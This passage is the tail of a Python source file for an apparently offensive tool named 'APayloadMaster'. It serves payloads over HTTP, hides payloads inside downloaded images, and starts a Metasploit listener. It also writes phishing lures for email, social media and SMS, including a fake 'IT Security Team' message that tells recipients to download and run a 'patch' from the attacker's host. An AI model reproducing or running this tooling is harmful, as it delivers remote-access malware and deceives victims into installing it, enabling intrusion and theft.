        with open(launcher_file, 'w') as f:
            f.write(launcher_content)
        
        print(f"{self.colors.GREEN}[+] Android launcher config created: {launcher_file}{self.colors.ENDC}")
        return launcher_file
    
    def start_http_server(self, port=8080):
        """Start HTTP file server"""
        if self.http_server:
            print(f"{self.colors.YELLOW}[*] HTTP server already running{self.colors.ENDC}")
            return
        
        os.chdir("server/uploads")
        
        class FileHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                print(f"{self.colors.CYAN}[HTTP] {args[0]} - {args[1]}{self.colors.ENDC}")
        
        def run_server():
            with socketserver.TCPServer(("", int(port)), FileHandler) as httpd:
                self.http_server = httpd
                print(f"{self.colors.GREEN}[+] HTTP server started on port {port}{self.colors.ENDC}")
                print(f"{self.colors.CYAN}[*] Serving files from: {os.getcwd()}{self.colors.ENDC}")
                httpd.serve_forever()
        
        thread = threading.Thread(target=run_server)
        thread.daemon = True
        thread.start()
    
    def download_and_hide_image(self, payload_path):
        """Download random image from unsplash and hide payload"""
        try:
            import requests
            url = "https://source.unsplash.com/random/800x600"
            response = requests.get(url, stream=True)
            
            if response.status_code == 200:
                image_path = f"output/bound/random_{int(time.time())}.jpg"
                with open(image_path, 'wb') as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)
                
                print(f"{self.colors.GREEN}[+] Image downloaded: {image_path}{self.colors.ENDC}")
                return self.hide_in_image(payload_path, image_path)
            else:
                print(f"{self.colors.RED}[!] Failed to download image{self.colors.ENDC}")
                return None
        except ImportError:
            print(f"{self.colors.RED}[!] Requests module not installed{self.colors.ENDC}")
            return None
    
    # ===== DISTRIBUTION =====
    
    def distribution_menu(self, filepath):
        """Payload distribution options"""
        print(f"\n{self.colors.GREEN}[DISTRIBUTION OPTIONS]{self.colors.ENDC}")
        print("="*50)
        print("1. Save locally")
        print("2. Start HTTP download server")
        print("3. Generate email template")
        print("4. Create social media message")
        print("5. Create SMS template")
        print("6. Back")
        
        choice = input(f"\n{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
        
        if choice == "1":
            save_path = input(f"{self.colors.YELLOW}[?] Save path (default: downloads/): {self.colors.ENDC}") or "downloads/"
            self.save_locally(filepath, save_path)
        elif choice == "2":
            self.create_download_link(filepath)
        elif choice == "3":
            self.generate_email_template(filepath)
        elif choice == "4":
            self.generate_social_media_message(filepath)
        elif choice == "5":
            self.generate_sms_template(filepath)
    
    def save_locally(self, filepath, save_dir):
        """Save file locally"""
        os.makedirs(save_dir, exist_ok=True)
        
        filename = os.path.basename(filepath)
        dest = os.path.join(save_dir, filename)
        
        import shutil
        shutil.copy2(filepath, dest)
        
        print(f"{self.colors.GREEN}[+] File saved: {dest}{self.colors.ENDC}")
        print(f"{self.colors.CYAN}[*] Size: {os.path.getsize(dest)} bytes{self.colors.ENDC}")
    
    def generate_email_template(self, filepath):
        """Generate email template for distribution"""
        filename = os.path.basename(filepath)
        download_url = f"http://{self.local_ip}:8080/{filename}"
        
        template = f"""
=== EMAIL TEMPLATE ===
Subject: Important Document / Invoice / Update

Body:
Dear User,

Please find attached the important document you requested.
You can also download it from: {download_url}

Best regards,
[Your Name]

=== OR ===

Subject: Security Update Required

Body:
Your account requires immediate security update.
Download and run the attached file to apply the patch.

Download link: {download_url}

Thank you,
IT Security Team
"""
        
        template_file = f"output/distribution/email_template_{filename}.txt"
        os.makedirs("output/distribution", exist_ok=True)
        
        with open(template_file, 'w') as f:
            f.write(template)
        
        print(f"{self.colors.GREEN}[+] Email template saved: {template_file}{self.colors.ENDC}")
    
    def generate_social_media_message(self, filepath):
        """Generate social media message template"""
        filename = os.path.basename(filepath)
        download_url = f"http://{self.local_ip}:8080/{filename}"
        
        template = f"""
=== SOCIAL MEDIA TEMPLATE ===

Twitter:
Check out this cool app I found! It's super useful. Download here: {download_url}

Facebook:
Hey friends! I just found this amazing tool that you all should try.
Get it from: {download_url}

Instagram (Bio):
Latest tool download: {download_url}

Discord/Telegram:
New tool release! Download from: {download_url}
"""
        
        template_file = f"output/distribution/social_media_{filename}.txt"
        os.makedirs("output/distribution", exist_ok=True)
        
        with open(template_file, 'w') as f:
            f.write(template)
        
        print(f"{self.colors.GREEN}[+] Social media template saved: {template_file}{self.colors.ENDC}")
    
    def generate_sms_template(self, filepath):
        """Generate SMS template"""
        filename = os.path.basename(filepath)
        download_url = f"http://{self.local_ip}:8080/{filename}"
        
        template = f"""
=== SMS TEMPLATE ===

Option 1:
Hi! Here's the file you requested: {download_url}

Option 2:
Urgent: Security update required. Download: {download_url}

Option 3:
Your document is ready: {download_url}
"""
        
        template_file = f"output/distribution/sms_template_{filename}.txt"
        os.makedirs("output/distribution", exist_ok=True)
        
        with open(template_file, 'w') as f:
            f.write(template)
        
        print(f"{self.colors.GREEN}[+] SMS template saved: {template_file}{self.colors.ENDC}")
    
    # ===== MAIN MENU =====
    
    def main_menu(self):
        """Main menu"""
        while True:
            print(f"\n{self.colors.PURPLE}╔═════════════════════════════════════════════════════════════════╗")
            print(f"║                     MAIN MENU - v3.0                        ║")
            print(f"║                 Author: {self.colors.YELLOW}mahi.cyberaware{self.colors.PURPLE}                     ║")
            print(f"╚═════════════════════════════════════════════════════════════════╝{self.colors.ENDC}")
            print(f"{self.colors.CYAN}1. {self.colors.GREEN}Create Payload{self.colors.CYAN} (Localhost/Port Forwarding){self.colors.ENDC}")
            print(f"{self.colors.CYAN}2. {self.colors.GREEN}Bind/Hide Payload{self.colors.CYAN} (Steganography/QR Codes){self.colors.ENDC}")
            print(f"{self.colors.CYAN}3. {self.colors.GREEN}Distribution Options{self.colors.CYAN} (Email/SMS/Templates){self.colors.ENDC}")
            print(f"{self.colors.CYAN}4. {self.colors.GREEN}Start Listener{self.colors.CYAN} (Metasploit){self.colors.ENDC}")
            print(f"{self.colors.CYAN}5. {self.colors.GREEN}Start HTTP Server{self.colors.CYAN} (File Sharing){self.colors.ENDC}")
            print(f"{self.colors.CYAN}6. {self.colors.YELLOW}Check Dependencies{self.colors.CYAN} (Required Tools){self.colors.ENDC}")
            print(f"{self.colors.CYAN}7. {self.colors.RED}Exit{self.colors.CYAN} (Cleanup Resources){self.colors.ENDC}")
            
            choice = input(f"\n{self.colors.YELLOW}[?] Select option (1-7): {self.colors.ENDC}")
            
            if choice == "1":
                self.create_payload_menu()
            elif choice == "2":
                self.binding_menu()
            elif choice == "3":
                if self.current_payload:
                    self.distribution_menu(self.current_payload)
                else:
                    filepath = input(f"{self.colors.YELLOW}[?] Enter payload path: {self.colors.ENDC}")
                    if os.path.exists(filepath):
                        self.distribution_menu(filepath)
            elif choice == "4":
                lhost = input(f"{self.colors.YELLOW}[?] Enter LHOST (default: {self.local_ip}): {self.colors.ENDC}") or self.local_ip
                lport = input(f"{self.colors.YELLOW}[?] Enter LPORT (default: 4444): {self.colors.ENDC}") or "4444"
                self.start_metasploit_listener(lhost, lport)
            elif choice == "5":
                port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
                self.start_http_server(port)
            elif choice == "6":
                missing = self.check_dependencies()
                if missing:
                    print(f"{self.colors.RED}[!] Missing: {', '.join(missing)}{self.colors.ENDC}")
                else:
                    print(f"{self.colors.GREEN}[+] All dependencies found{self.colors.ENDC}")
            elif choice == "7":
                print(f"{self.colors.RED}[!] Exiting APayloadMaster...{self.colors.ENDC}")
                
                # Stop ngrok if running
                if self.ngrok_process:
                    self.ngrok_process.terminate()
                    print(f"{self.colors.YELLOW}[*] Ngrok stopped{self.colors.ENDC}")
                
                # Stop HTTP server if running
                if self.http_server:
                    self.http_server.shutdown()
                    print(f"{self.colors.YELLOW}[*] HTTP server stopped{self.colors.ENDC}")
                
                print(f"{self.colors.GREEN}[+] Cleanup complete. Goodbye!{self.colors.ENDC}")
                sys.exit(0)

def main():
    """Main entry point"""
    tool = APayloadMaster()
    tool.display_banner()
    
    # Check for critical dependencies
    missing = tool.check_dependencies()
    if "Metasploit Framework" in missing:
        print(f"{Colors.RED}[!] Critical: Metasploit not found!{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Install with: sudo apt install metasploit-framework{Colors.ENDC}")
        choice = input(f"{Colors.YELLOW}[?] Continue anyway? (y/n): {Colors.ENDC}")
        if choice.lower() != 'y':
            return
    
    tool.main_menu()

if __name__ == "__main__":
    main()
